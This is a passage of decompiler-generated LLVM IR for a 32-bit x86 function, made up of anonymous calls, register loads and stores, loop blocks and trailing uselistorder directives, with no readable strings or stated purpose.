  %v2_804cd85 = load i32, i32* %v1_804cd85, align 4
  store i32 %v2_804cd85, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804cd85, align 4
  store i32 9, i32* %v1_804cd84, align 4
  %v3_804cd8a = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804cd8a, i32* %eax.global-to-local, align 4
  %v0_804cd8f = load i32, i32* @esp, align 4
  %v1_804cd8f = inttoptr i32 %v0_804cd8f to i32*
  %v2_804cd8f = load i32, i32* %v1_804cd8f, align 4
  store i32 %v2_804cd8f, i32* @esi, align 4
  store i32 %v3_804cd8a, i32* @ebx, align 4
  %v1_804cd92 = add i32 %v0_804cd8f, 4139
  store i32 %v1_804cd92, i32* %eax.global-to-local, align 4
  store i32 %v1_804cd92, i32* %v1_804cd8f, align 4
  %v2_804cd9a = call i32 @function_804f5b0(i8* null)
  store i32 %v2_804cd9a, i32* %eax.global-to-local, align 4
  %v0_804cd9f = load i32, i32* @esp, align 4
  %v1_804cd9f = inttoptr i32 %v0_804cd9f to i32*
  %v2_804cd9f = load i32, i32* %v1_804cd9f, align 4
  store i32 %v2_804cd9f, i32* %edx.global-to-local, align 4
  %v3_804cd9f = add i32 %v0_804cd9f, 4
  %v1_804cda0 = inttoptr i32 %v3_804cd9f to i32*
  %v0_804cda1 = load i32, i32* @ebx, align 4
  store i32 %v0_804cda1, i32* %v1_804cda0, align 4
  %v1_804cda2 = add i32 %v0_804cd9f, 4139
  store i32 %v1_804cda2, i32* %edx.global-to-local, align 4
  %v2_804cda9 = add i32 %v1_804cda2, %v2_804cd9a
  store i32 %v2_804cda9, i32* %eax.global-to-local, align 4
  store i32 %v2_804cda9, i32* %v1_804cd9f, align 4
  %v3_804cdad = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804cdb2 = load i32, i32* @esp, align 4
  %v1_804cdb2 = inttoptr i32 %v0_804cdb2 to i32*
  %v1_804cdb3 = add i32 %v0_804cdb2, 4139
  store i32 %v1_804cdb3, i32* %eax.global-to-local, align 4
  store i32 %v1_804cdb3, i32* %v1_804cdb2, align 4
  %v1_804cdbb = call i32 @function_804ff14(i32 0)
  store i32 %v1_804cdbb, i32* %eax.global-to-local, align 4
  %v0_804cdc0 = load i32, i32* @esp, align 4
  %v1_804cdc0 = add i32 %v0_804cdc0, 16
  store i32 %v1_804cdbb, i32* @ebp, align 4
  %v1_804cdc5 = icmp eq i32 %v1_804cdbb, 0
  br i1 %v1_804cdc5, label %dec_label_pc_804cc89, label %dec_label_pc_804cdcd.preheader

dec_label_pc_804cdcd.preheader:                   ; preds = %dec_label_pc_804cd48
  %v3_804cdd083 = inttoptr i32 %v0_804cdc0 to i32*
  store i32 %v1_804cdbb, i32* %v3_804cdd083, align 4
  %v0_804cdd184 = call i32 @function_8050005()
  store i32 %v0_804cdd184, i32* @eax, align 4
  %v0_804cdd685 = load i32, i32* @esp, align 4
  store i32 %v0_804cdd184, i32* @esi, align 4
  %v1_804cddb87 = icmp eq i32 %v0_804cdd184, 0
  br i1 %v1_804cddb87, label %dec_label_pc_804d01e, label %dec_label_pc_804cde3

dec_label_pc_804cde3:                             ; preds = %dec_label_pc_804cdcd.preheader, %dec_label_pc_804cdcd.backedge
  %v0_804cdd688 = phi i32 [ %v0_804cdd6, %dec_label_pc_804cdcd.backedge ], [ %v0_804cdd685, %dec_label_pc_804cdcd.preheader ]
  %v1_804cde3 = add i32 %v0_804cdd688, 20
  %v2_804cde3 = inttoptr i32 %v1_804cde3 to i32*
  %v3_804cde3 = load i32, i32* %v2_804cde3, align 4
  store i32 %v3_804cde3, i32* @eax, align 4
  %v1_804cde7 = icmp eq i32 %v3_804cde3, 0
  %v1_804cde9 = icmp eq i1 %v1_804cde7, false
  br i1 %v1_804cde9, label %dec_label_pc_804d01e, label %dec_label_pc_804cdef

dec_label_pc_804cdef:                             ; preds = %dec_label_pc_804cde3
  %v2_804cdef = add i32 %v0_804cdd688, 12
  %v3_804cdef = inttoptr i32 %v2_804cdef to i32*
  store i32 %v3_804cde3, i32* %v3_804cdef, align 4
  %v2_804cdf0 = add i32 %v0_804cdd688, 8
  %v3_804cdf0 = inttoptr i32 %v2_804cdf0 to i32*
  store i32 %v3_804cde3, i32* %v3_804cdf0, align 4
  %v1_804cdf1 = add i32 %v0_804cdd688, 4
  %v2_804cdf1 = inttoptr i32 %v1_804cdf1 to i32*
  store i32 4096, i32* %v2_804cdf1, align 4
  %v1_804cdf6 = add i32 %v0_804cdd688, 43
  store i32 %v1_804cdf6, i32* %edx.global-to-local, align 4
  %v3_804cdfa = inttoptr i32 %v0_804cdd688 to i32*
  store i32 %v1_804cdf6, i32* %v3_804cdfa, align 4
  %v2_804cdfb = call i32 @function_804f640(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804cdfb, i32* %eax.global-to-local, align 4
  %v0_804ce00 = load i32, i32* @esp, align 4
  %v1_804ce00 = inttoptr i32 %v0_804ce00 to i32*
  %v2_804ce00 = load i32, i32* %v1_804ce00, align 4
  store i32 %v2_804ce00, i32* @ebx, align 4
  %v3_804ce00 = add i32 %v0_804ce00, 4
  %v1_804ce01 = inttoptr i32 %v3_804ce00 to i32*
  %v2_804ce01 = load i32, i32* %v1_804ce01, align 4
  store i32 %v2_804ce01, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804ce01, align 4
  store i32 6, i32* %v1_804ce00, align 4
  %v3_804ce06 = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804ce06, i32* %eax.global-to-local, align 4
  %v0_804ce0b = load i32, i32* @esp, align 4
  %v1_804ce0b = inttoptr i32 %v0_804ce0b to i32*
  %v2_804ce0b = load i32, i32* %v1_804ce0b, align 4
  store i32 %v2_804ce0b, i32* %edx.global-to-local, align 4
  %v3_804ce0b = add i32 %v0_804ce0b, 4
  %v1_804ce0c = inttoptr i32 %v3_804ce0b to i32*
  store i32 %v3_804ce06, i32* %v1_804ce0c, align 4
  %v1_804ce0e = add i32 %v0_804ce0b, 4139
  store i32 %v1_804ce0e, i32* %eax.global-to-local, align 4
  store i32 %v1_804ce0e, i32* %v1_804ce0b, align 4
  %v3_804ce16 = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804ce16, i32* %eax.global-to-local, align 4
  %v0_804ce1b = load i32, i32* @esp, align 4
  %v1_804ce1b = inttoptr i32 %v0_804ce1b to i32*
  %v2_804ce1b = load i32, i32* %v1_804ce1b, align 4
  store i32 %v2_804ce1b, i32* %eax.global-to-local, align 4
  %v1_804ce1c = add i32 %v0_804ce1b, 4139
  store i32 %v1_804ce1c, i32* %edx.global-to-local, align 4
  store i32 %v1_804ce1c, i32* %v1_804ce1b, align 4
  %v2_804ce24 = call i32 @function_804f5b0(i8* null)
  store i32 %v2_804ce24, i32* %eax.global-to-local, align 4
  %v0_804ce29 = load i32, i32* @esp, align 4
  %v1_804ce29 = inttoptr i32 %v0_804ce29 to i32*
  %v3_804ce29 = add i32 %v0_804ce29, 4
  %v1_804ce2a = inttoptr i32 %v3_804ce29 to i32*
  %v2_804ce2a = load i32, i32* %v1_804ce2a, align 4
  store i32 %v2_804ce2a, i32* @ebx, align 4
  %v0_804ce2b = load i32, i32* @edi, align 4
  store i32 %v0_804ce2b, i32* %v1_804ce2a, align 4
  %v1_804ce2c = add i32 %v0_804ce29, 4139
  store i32 %v1_804ce2c, i32* %edx.global-to-local, align 4
  %v2_804ce33 = add i32 %v1_804ce2c, %v2_804ce24
  store i32 %v2_804ce33, i32* %eax.global-to-local, align 4
  store i32 %v2_804ce33, i32* %v1_804ce29, align 4
  %v3_804ce37 = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804ce37, i32* %eax.global-to-local, align 4
  %v0_804ce3c = load i32, i32* @esp, align 4
  %v1_804ce3c = inttoptr i32 %v0_804ce3c to i32*
  %v2_804ce3c = load i32, i32* %v1_804ce3c, align 4
  store i32 %v2_804ce3c, i32* %eax.global-to-local, align 4
  %v3_804ce3c = add i32 %v0_804ce3c, 4
  %v1_804ce3d = inttoptr i32 %v3_804ce3c to i32*
  %v2_804ce3d = load i32, i32* %v1_804ce3d, align 4
  store i32 %v2_804ce3d, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804ce3d, align 4
  store i32 9, i32* %v1_804ce3c, align 4
  %v3_804ce42 = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804ce42, i32* @ebx, align 4
  %v0_804ce49 = load i32, i32* @esp, align 4
  %v1_804ce49 = inttoptr i32 %v0_804ce49 to i32*
  %v1_804ce4a = add i32 %v0_804ce49, 4139
  store i32 %v1_804ce4a, i32* %eax.global-to-local, align 4
  store i32 %v1_804ce4a, i32* %v1_804ce49, align 4
  %v2_804ce52 = call i32 @function_804f5b0(i8* null)
  store i32 %v2_804ce52, i32* %eax.global-to-local, align 4
  %v0_804ce57 = load i32, i32* @esp, align 4
  %v1_804ce57 = inttoptr i32 %v0_804ce57 to i32*
  %v2_804ce57 = load i32, i32* %v1_804ce57, align 4
  store i32 %v2_804ce57, i32* %edx.global-to-local, align 4
  %v3_804ce57 = add i32 %v0_804ce57, 4
  %v1_804ce58 = inttoptr i32 %v3_804ce57 to i32*
  %v0_804ce59 = load i32, i32* @ebx, align 4
  store i32 %v0_804ce59, i32* %v1_804ce58, align 4
  %v1_804ce5a = add i32 %v0_804ce57, 4139
  store i32 %v1_804ce5a, i32* %edx.global-to-local, align 4
  %v2_804ce61 = add i32 %v1_804ce5a, %v2_804ce52
  store i32 %v2_804ce61, i32* %eax.global-to-local, align 4
  store i32 %v2_804ce61, i32* %v1_804ce57, align 4
  %v3_804ce65 = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804ce65, i32* %eax.global-to-local, align 4
  %v0_804ce6a = load i32, i32* @esp, align 4
  %v1_804ce6a = inttoptr i32 %v0_804ce6a to i32*
  %v2_804ce6a = load i32, i32* %v1_804ce6a, align 4
  store i32 %v2_804ce6a, i32* @ebx, align 4
  %v1_804ce6b = add i32 %v0_804ce6a, 4139
  store i32 %v1_804ce6b, i32* %eax.global-to-local, align 4
  store i32 %v1_804ce6b, i32* %v1_804ce6a, align 4
  %v2_804ce73 = call i32 @function_804f5b0(i8* null)
  store i32 %v2_804ce73, i32* %eax.global-to-local, align 4
  %v0_804ce78 = load i32, i32* @esp, align 4
  %v1_804ce78 = inttoptr i32 %v0_804ce78 to i32*
  %v2_804ce78 = load i32, i32* %v1_804ce78, align 4
  store i32 %v2_804ce78, i32* %edx.global-to-local, align 4
  %v3_804ce78 = add i32 %v0_804ce78, 4
  %v1_804ce79 = inttoptr i32 %v3_804ce78 to i32*
  store i32 ptrtoint (i32* @global_var_805244d.6 to i32), i32* %v1_804ce79, align 4
  %v1_804ce7f = add i32 %v0_804ce78, 4139
  store i32 %v1_804ce7f, i32* %edx.global-to-local, align 4
  %v2_804ce86 = add i32 %v1_804ce7f, %v2_804ce73
  store i32 %v2_804ce86, i32* %eax.global-to-local, align 4
  store i32 %v2_804ce86, i32* %v1_804ce78, align 4
  %v3_804ce8a = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804ce8a, i32* %eax.global-to-local, align 4
  %v0_804ce8f = load i32, i32* @esp, align 4
  %v1_804ce8f = inttoptr i32 %v0_804ce8f to i32*
  %v2_804ce8f = load i32, i32* %v1_804ce8f, align 4
  store i32 %v2_804ce8f, i32* @ebx, align 4
  %v1_804ce90 = add i32 %v0_804ce8f, 4139
  store i32 %v1_804ce90, i32* %eax.global-to-local, align 4
  store i32 %v1_804ce90, i32* %v1_804ce8f, align 4
  %v2_804ce98 = call i32 @function_804f5b0(i8* null)
  store i32 %v2_804ce98, i32* %eax.global-to-local, align 4
  %v0_804ce9d = load i32, i32* @esp, align 4
  %v1_804ce9d = inttoptr i32 %v0_804ce9d to i32*
  %v3_804ce9d = add i32 %v0_804ce9d, 4
  %v0_804ce9e = load i32, i32* @esi, align 4
  %v1_804ce9e = add i32 %v0_804ce9e, 11
  store i32 %v1_804ce9e, i32* %edx.global-to-local, align 4
  %v1_804cea1 = inttoptr i32 %v3_804ce9d to i32*
  store i32 %v1_804ce9e, i32* %v1_804cea1, align 4
  %v1_804cea3 = add i32 %v0_804ce9d, 4139
  store i32 %v1_804cea3, i32* %edx.global-to-local, align 4
  %v2_804ceaa = add i32 %v1_804cea3, %v2_804ce98
  store i32 %v2_804ceaa, i32* %eax.global-to-local, align 4
  store i32 %v2_804ceaa, i32* %v1_804ce9d, align 4
  %v3_804ceae = call i32 @function_804f5d0(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804ceb3 = load i32, i32* @esp, align 4
  %v1_804ceb6 = add i32 %v0_804ceb3, 8
  %v2_804ceb6 = inttoptr i32 %v1_804ceb6 to i32*
  store i32 4096, i32* %v2_804ceb6, align 4
  %v1_804cebb = add i32 %v0_804ceb3, 43
  store i32 %v1_804cebb, i32* %eax.global-to-local, align 4
  %v2_804cebf = add i32 %v0_804ceb3, 4
  %v3_804cebf = inttoptr i32 %v2_804cebf to i32*
  store i32 %v1_804cebb, i32* %v3_804cebf, align 4
  %v1_804cec0 = add i32 %v0_804ceb3, 4139
  store i32 %v1_804cec0, i32* %edx.global-to-local, align 4
  %v3_804cec7 = inttoptr i32 %v0_804ceb3 to i32*
  store i32 %v1_804cec0, i32* %v3_804cec7, align 4
  %v4_804cec8 = call i32 @function_804fd22(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804cecd = load i32, i32* @esp, align 4
  %v1_804ced0 = add i32 %v4_804cec8, 1
  %v8_804ced0 = icmp eq i32 %v1_804ced0, 0
  store i32 %v1_804ced0, i32* %eax.global-to-local, align 4
  br i1 %v8_804ced0, label %dec_label_pc_804cdcd.backedge, label %dec_label_pc_804ced7

dec_label_pc_804ced7:                             ; preds = %dec_label_pc_804cdef
  %v1_804ceda = add i32 %v0_804cecd, 43
  store i32 %v1_804ceda, i32* %eax.global-to-local, align 4
  %v3_804cede = inttoptr i32 %v0_804cecd to i32*
  store i32 %v1_804ceda, i32* %v3_804cede, align 4
  %v2_804cedf = call i32 @function_804f5b0(i8* null)
  %v0_804cee4 = load i32, i32* @esp, align 4
  %v1_804cee7 = add i32 %v0_804cee4, 8764
  store i32 %v1_804cee7, i32* @edx, align 4
  %v2_804ceee = add i32 %v0_804cee4, 8
  %v3_804ceee = inttoptr i32 %v2_804ceee to i32*
  store i32 %v1_804cee7, i32* %v3_804ceee, align 4
  %v2_804ceef = add i32 %v0_804cee4, 4
  %v3_804ceef = inttoptr i32 %v2_804ceef to i32*
  store i32 %v2_804cedf, i32* %v3_804ceef, align 4
  %v1_804cef0 = add i32 %v0_804cee4, 43
  store i32 %v1_804cef0, i32* %eax.global-to-local, align 4
  %v3_804cef4 = inttoptr i32 %v0_804cee4 to i32*
  store i32 %v1_804cef0, i32* %v3_804cef4, align 4
  %v4_804cef5 = call i32 @function_804f8a0(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804cefa = load i32, i32* @esp, align 4
  %v1_804cefd = add i32 %v4_804cef5, 1
  %v8_804cefd = icmp eq i32 %v1_804cefd, 0
  store i32 %v1_804cefd, i32* %eax.global-to-local, align 4
  br i1 %v8_804cefd, label %dec_label_pc_804cdcd.backedge, label %dec_label_pc_804cf04

dec_label_pc_804cf04:                             ; preds = %dec_label_pc_804ced7
  %v0_804cf04 = load i32, i32* @ebx, align 4
  %v2_804cf04 = add i32 %v0_804cefa, 12
  %v3_804cf04 = inttoptr i32 %v2_804cf04 to i32*
  store i32 %v0_804cf04, i32* %v3_804cf04, align 4
  %v0_804cf05 = load i32, i32* @ebx, align 4
  %v2_804cf05 = add i32 %v0_804cefa, 8
  %v3_804cf05 = inttoptr i32 %v2_804cf05 to i32*
  store i32 %v0_804cf05, i32* %v3_804cf05, align 4
  %v1_804cf06 = add i32 %v0_804cefa, 4
  %v2_804cf06 = inttoptr i32 %v1_804cf06 to i32*
  store i32 10, i32* %v2_804cf06, align 4
  %v0_804cf08 = load i32, i32* @edi, align 4
  %v3_804cf08 = inttoptr i32 %v0_804cefa to i32*
  store i32 %v0_804cf08, i32* %v3_804cf08, align 4
  %v3_804cf09 = call i32 @function_804f6b0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804cf09, i32* %eax.global-to-local, align 4
  %v0_804cf0e = load i32, i32* @esp, align 4
  %v1_804cf0e = inttoptr i32 %v0_804cf0e to i32*
  %v2_804cf0e = load i32, i32* %v1_804cf0e, align 4
  store i32 %v2_804cf0e, i32* %edx.global-to-local, align 4
  %v3_804cf0e = add i32 %v0_804cf0e, 4
  %v1_804cf0f = inttoptr i32 %v3_804cf0e to i32*
  store i32 9, i32* %v1_804cf0f, align 4
  store i32 %v3_804cf09, i32* %v1_804cf0e, align 4
  %v4_804cf13 = call i32 @function_804fc30(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804cf13, i32* %eax.global-to-local, align 4
  %v0_804cf18 = load i32, i32* @esp, align 4
  %v1_804cf18 = add i32 %v0_804cf18, 20
  %v2_804cf18 = inttoptr i32 %v1_804cf18 to i32*
  store i32 1, i32* %v2_804cf18, align 4
  %v0_804cf20 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804cdcd.backedge

dec_label_pc_804cdcd.backedge:                    ; preds = %dec_label_pc_804cf04, %dec_label_pc_804cdef, %dec_label_pc_804ced7
  %v0_804cdcd42.in = phi i32 [ %v0_804cf20, %dec_label_pc_804cf04 ], [ %v0_804cecd, %dec_label_pc_804cdef ], [ %v0_804cefa, %dec_label_pc_804ced7 ]
  %v0_804cdd0.pre = load i32, i32* @ebp, align 4
  %v3_804cdd0 = inttoptr i32 %v0_804cdcd42.in to i32*
  store i32 %v0_804cdd0.pre, i32* %v3_804cdd0, align 4
  %v0_804cdd1 = call i32 @function_8050005()
  store i32 %v0_804cdd1, i32* @eax, align 4
  %v0_804cdd6 = load i32, i32* @esp, align 4
  store i32 %v0_804cdd1, i32* @esi, align 4
  %v1_804cddb = icmp eq i32 %v0_804cdd1, 0
  br i1 %v1_804cddb, label %dec_label_pc_804d01e, label %dec_label_pc_804cde3

dec_label_pc_804cf28:                             ; preds = %dec_label_pc_804cbcb
  %v1_804cf28 = add i32 %v0_804cf28, 1
  store i32 %v1_804cf28, i32* @esi, align 4
  %v9_804cf29 = icmp eq i32 %v0_804cf28, 0
  %v1_804cf2c = icmp eq i1 %v9_804cf29, false
  br i1 %v1_804cf2c, label %dec_label_pc_804cbd3, label %dec_label_pc_804cf32

dec_label_pc_804cf32:                             ; preds = %dec_label_pc_804cf28
  %v1_804cf32 = add i32 %v0_804cbd5, 3
  %v2_804cf32 = inttoptr i32 %v1_804cf32 to i8*
  %v3_804cf32 = load i8, i8* %v2_804cf32, align 1
  %v12_804cf32 = icmp eq i8 %v3_804cf32, 65
  %.stack_var_-8769.1 = select i1 %v12_804cf32, i8 1, i8 %stack_var_-8769.1.ph
  %v1_804cf38 = add i32 %v0_804cbd5, 1
  store i32 %v1_804cf38, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804cbb3.outer

dec_label_pc_804cf40:                             ; preds = %dec_label_pc_804cbc3, %dec_label_pc_804cbbb
  %v1_804cf40 = and i32 %v0_804cf40, -256
  %v2_804cf40 = or i32 %v1_804cf40, 1
  br label %dec_label_pc_804cbd5

dec_label_pc_804cf47:                             ; preds = %dec_label_pc_804cb2b, %dec_label_pc_804cb1c
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cb41

dec_label_pc_804cf57:                             ; preds = %dec_label_pc_804cc3b
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804cf5e = call i32 @function_804ebe0(i8 6)
  store i32 %v3_804cf5e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804cf6a = call i32 @function_804ebe0(i8 7)
  store i32 %v3_804cf6a, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804cf76 = call i32 @function_804ebe0(i8 9)
  store i32 %v3_804cf76, i32* %eax.global-to-local, align 4
  %v2_804cf86.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804cf7e

dec_label_pc_804cf7e:                             ; preds = %dec_label_pc_804cac4, %dec_label_pc_804cf57
  %v2_804cf86 = phi i32 [ %v0_804ca13, %dec_label_pc_804cac4 ], [ %v2_804cf86.pre, %dec_label_pc_804cf57 ]
  %v0_804cf84 = load i32, i32* @ebx, align 4
  store i32 %v0_804cf84, i32* %eax.global-to-local, align 4
  store i32 %v2_804cf86, i32* @ebx, align 4
  store i32 %v0_804ca12, i32* @esi, align 4
  store i32 %v0_804ca11, i32* @edi, align 4
  store i32 %v0_804ca10, i32* @ebp, align 4
  ret i32 %v0_804cf84

dec_label_pc_804cf92:                             ; preds = %dec_label_pc_804cca1, %dec_label_pc_804cc89
  %v2_804cf95 = inttoptr i32 %v1_804cc96 to i32*
  %v3_804cf95 = load i32, i32* %v2_804cf95, align 4
  store i32 %v3_804cf95, i32* %edx.global-to-local, align 4
  %v3_804cf99 = inttoptr i32 %v0_804cc96 to i32*
  store i32 %v3_804cf95, i32* %v3_804cf99, align 4
  %v0_804cf9a = call i32 @function_804fea4()
  store i32 %v0_804cf9a, i32* %eax.global-to-local, align 4
  %v0_804cf9f = load i32, i32* @esp, align 4
  %v1_804cf9f = add i32 %v0_804cf9f, 20
  %v2_804cf9f = inttoptr i32 %v1_804cf9f to i8*
  %v3_804cf9f = load i8, i8* %v2_804cf9f, align 1
  %v4_804cf9f = sext i8 %v3_804cf9f to i32
  store i32 %v4_804cf9f, i32* @ebx, align 4
  %v1_804cfa4 = add i32 %v0_804cf9f, 16
  br label %dec_label_pc_804cfa7

dec_label_pc_804cfa7:                             ; preds = %dec_label_pc_804cc5d, %dec_label_pc_804cf92
  %v0_804cfa7 = phi i32 [ %v15_804ca14, %dec_label_pc_804cc5d ], [ %v1_804cfa4, %dec_label_pc_804cf92 ]
  %v1_804cfaa = add i32 %v0_804cfa7, -16
  %v2_804cfaa = inttoptr i32 %v1_804cfaa to i32*
  store i32 1, i32* %v2_804cfaa, align 4
  %v1_804cfac = sext i8 %stack_var_-8769.2 to i32
  %v2_804cfac = call i32 @function_8051700(i32 %v1_804cfac)
  store i32 %v2_804cfac, i32* %eax.global-to-local, align 4
  %v0_804cfb1 = load i32, i32* @esp, align 4
  %v1_804cfb1 = inttoptr i32 %v0_804cfb1 to i32*
  store i32 6, i32* %v1_804cfb1, align 4
  %v3_804cfb8 = call i32 @function_804ebe0(i8 %stack_var_-8769.2)
  store i32 %v3_804cfb8, i32* %eax.global-to-local, align 4
  %v0_804cfbd = load i32, i32* @esp, align 4
  %v1_804cfbd = inttoptr i32 %v0_804cfbd to i32*
  store i32 7, i32* %v1_804cfbd, align 4
  %v3_804cfc4 = call i32 @function_804ebe0(i8 %stack_var_-8769.2)
  store i32 %v3_804cfc4, i32* %eax.global-to-local, align 4
  %v0_804cfc9 = load i32, i32* @esp, align 4
  %v1_804cfc9 = inttoptr i32 %v0_804cfc9 to i32*
  store i32 9, i32* %v1_804cfc9, align 4
  %v3_804cfd0 = call i32 @function_804ebe0(i8 %stack_var_-8769.2)
  %v0_804cfd5 = load i32, i32* @esp, align 4
  %v0_804cfd8 = load i32, i32* @ebx, align 4
  store i32 %v0_804cfd8, i32* %eax.global-to-local, align 4
  %v1_804cfda = add i32 %v0_804cfd5, 8780
  %v1_804cfe0 = inttoptr i32 %v1_804cfda to i32*
  %v2_804cfe0 = load i32, i32* %v1_804cfe0, align 4
  store i32 %v2_804cfe0, i32* @ebx, align 4
  %v3_804cfe0 = add i32 %v0_804cfd5, 8784
  %v1_804cfe1 = inttoptr i32 %v3_804cfe0 to i32*
  %v2_804cfe1 = load i32, i32* %v1_804cfe1, align 4
  store i32 %v2_804cfe1, i32* @esi, align 4
  %v3_804cfe1 = add i32 %v0_804cfd5, 8788
  %v1_804cfe2 = inttoptr i32 %v3_804cfe1 to i32*
  %v2_804cfe2 = load i32, i32* %v1_804cfe2, align 4
  store i32 %v2_804cfe2, i32* @edi, align 4
  %v3_804cfe2 = add i32 %v0_804cfd5, 8792
  %v1_804cfe3 = inttoptr i32 %v3_804cfe2 to i32*
  %v2_804cfe3 = load i32, i32* %v1_804cfe3, align 4
  store i32 %v2_804cfe3, i32* @ebp, align 4
  ret i32 %v0_804cfd8

dec_label_pc_804cfe5:                             ; preds = %dec_label_pc_804ca10
  %v3_804cfe5 = load i8, i8* %stack_var_-48, align 1
  %v4_804cfe5 = sext i8 %v3_804cfe5 to i32
  %v4_804cffb = zext i8 %tmp47 to i32
  %v6_804cffb = and i32 %v4_804cfe5, -256
  %v7_804cffb = or i32 %v6_804cffb, %v4_804cffb
  store i32 %v7_804cffb, i32* %eax.global-to-local, align 4
  store i8 48, i8* %stack_var_-48, align 1
  br label %dec_label_pc_804cac4

dec_label_pc_804d01e:                             ; preds = %dec_label_pc_804cdcd.backedge, %dec_label_pc_804cde3, %dec_label_pc_804cdcd.preheader
  %v0_804cdd6.lcssa = phi i32 [ %v0_804cdd685, %dec_label_pc_804cdcd.preheader ], [ %v0_804cdd688, %dec_label_pc_804cde3 ], [ %v0_804cdd6, %dec_label_pc_804cdcd.backedge ]
  %v0_804d021 = load i32, i32* @ebp, align 4
  %v3_804d021 = inttoptr i32 %v0_804cdd6.lcssa to i32*
  store i32 %v0_804d021, i32* %v3_804d021, align 4
  %v0_804d022 = call i32 @function_804fea4()
  store i32 %v0_804d022, i32* %eax.global-to-local, align 4
  %v0_804d027 = load i32, i32* @esp, align 4
  %v1_804d027 = add i32 %v0_804d027, 16
  br label %dec_label_pc_804cc89

; uselistorder directives
  uselistorder i32 %v1_804cf38, { 1, 0 }
  uselistorder i32 %v1_804cf28, { 2, 0, 1 }
  uselistorder i32 %v0_804cdd1, { 1, 0, 2 }
  uselistorder i32 %v0_804cefa, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804cecd, { 0, 2, 1 }
  uselistorder i32 %v0_804cdd688, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v1_804cdbb, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804cd3e, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804ccb3, { 0, 2, 1 }
  uselistorder i32 %v1_804cc96, { 1, 0 }
  uselistorder i32 %v0_804cc96, { 0, 5, 1, 2, 3, 4, 6 }
  uselistorder i32 %v0_804cc91, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804cc89, { 1, 0 }
  uselistorder i32 %v4_804cc63, { 1, 0, 2 }
  uselistorder i8 %stack_var_-8769.2, { 0, 2, 1, 3 }
  uselistorder i8* %.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804cc1f, { 1, 0 }
  uselistorder i32 %v3_804cc17, { 1, 3, 2, 4, 0 }
  uselistorder i8 %v3_804cbfa, { 0, 2, 1 }
  uselistorder i32 %v1_804cbfa, { 0, 2, 1 }
  uselistorder i32 %v1_804cbd5, { 1, 0 }
  uselistorder i32 %storemerge4, { 0, 2, 1 }
  uselistorder i32 %v1_804cbb6, { 2, 3, 4, 0, 1, 5, 6, 7 }
  uselistorder i32 %v7_804cbb3, { 0, 3, 1, 2 }
  uselistorder i32 %v0_804cf40, { 1, 0, 2 }
  uselistorder i32 %v0_804cf28, { 3, 2, 0, 1 }
  uselistorder i8 %stack_var_-8769.1.ph, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804cb65, { 0, 2, 1 }
  uselistorder i32 %v7_804cb62, { 1, 0 }
  uselistorder i32 %v0_804cb5f, { 1, 0 }
  uselistorder i32 %v4_804cb0c, { 1, 2, 0 }
  uselistorder i32 %v7_804cb48, { 1, 0, 2 }
  uselistorder i32 %v1_804cb5f, { 2, 0, 1, 3 }
  uselistorder i32 %v8_804cb36, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804cb35, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804cb74, { 1, 0, 2 }
  uselistorder i32 %v2_804ca9a, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v2_804ca1a, { 1, 2, 0, 3 }
  uselistorder i32 %v15_804ca14, { 3, 0, 1, 2 }
  uselistorder i8* %stack_var_-561, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i8** %stack_var_-8796, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 1, 14, 13, 12, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i8* %stack_var_-48, { 4, 3, 0, 1, 2 }
  uselistorder i32* %stack_var_-32, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 28, 31, 32, 33, 34, 35, 36, 37 }
